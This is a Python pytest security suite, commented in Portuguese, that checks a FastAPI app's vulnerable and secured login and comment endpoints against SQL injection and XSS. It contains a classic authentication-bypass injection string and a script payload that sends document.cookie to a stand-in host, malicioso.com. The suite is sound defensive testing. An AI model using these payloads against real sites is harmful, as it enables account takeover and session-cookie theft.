"""
Suíte de testes ofensivos e defensivos para validação de SQL Injection e XSS.
"""

import pytest
from fastapi.testclient import TestClient
from main import app

cliente = TestClient(app)


# ==============================================================================
# AUDITORIA OFENSIVA: PROVANDO AS VULNERABILIDADES NO ENDPOINT INSEGURO
# ==============================================================================

@pytest.mark.security
def test_deve_comprovar_vulnerabilidade_de_sql_injection():
    """
    Comprova que a rota vulneravel permite burlar a autenticacao
    e logar como administrador sem conhecer a senha.
    """
    # ARRANGE: Payload ofensivo clássico de subversão de cláusula WHERE
    payload_malicioso = {
        "email": "admin@hubsolidario.org' --",
        "senha": "senha_completamente_incorreta"
    }

    # ACT: Disparo da requisição maliciosa
    resposta = cliente.post("/vulneravel/login", json=payload_malicioso)

    # ASSERT: O endpoint vulnerável autentica indevidamente o invasor
    assert resposta.status_code == 200
    dados = resposta.json()
    assert dados["email"] == "admin@hubsolidario.org"
    assert dados["is_admin"] is True


@pytest.mark.security
def test_deve_comprovar_vulnerabilidade_de_xss():
    """
    Comprova que a rota vulneravel aceita tags de script executaveis sem escapar.
    """
    # ARRANGE: Payload malicioso de Cross-Site Scripting
    payload_xss = {
        "autor": "Atacante",
        "conteudo": "<script>fetch('http://malicioso.com?cookie=' + document.cookie)</script>"
    }

    # ACT: Envio do comentário
    resposta = cliente.post("/vulneravel/comentarios", json=payload_xss)

    # ASSERT: O endpoint vulnerável devolveu a tag <script> intacta
    assert resposta.status_code == 200
    assert "<script>" in resposta.json()["conteudo"]


# ==============================================================================
# AUDITORIA DEFENSIVA: COMPROVANDO A EFICÁCIA DA MITIGAÇÃO NO ENDPOINT SEGURO
# ==============================================================================

@pytest.mark.security
def test_endpoint_seguro_deve_bloquear_sql_injection():
    """
    Comprova que a rota segura barra a tentativa de SQL Injection
    retornando status HTTP 401 Unauthorized.
    """
    # ARRANGE
    payload_malicioso = {
        "email": "admin@hubsolidario.org' --",
        "senha": "senha_completamente_incorreta"
    }

    # ACT
    resposta = cliente.post("/seguro/login", json=payload_malicioso)

    # ASSERT
    assert resposta.status_code == 401
    assert resposta.json()["detail"] == "Credenciais invalidas"


@pytest.mark.security
def test_endpoint_seguro_deve_sanitizar_tags_xss():
    """
    Comprova que a rota segura sanitiza caracteres perigosos,
    convertendo tags executáveis em entidades HTML inofensivas.
    """
    # ARRANGE
    payload_xss = {
        "autor": "Atacante",
        "conteudo": "<script>alert('Ataque XSS')</script>"
    }

    # ACT
    resposta = cliente.post("/seguro/comentarios", json=payload_xss)

    # ASSERT
    assert resposta.status_code == 200
    conteudo_retornado = resposta.json()["conteudo"]
    assert "<script>" not in conteudo_retornado
    assert "&lt;script&gt;" in conteudo_retornado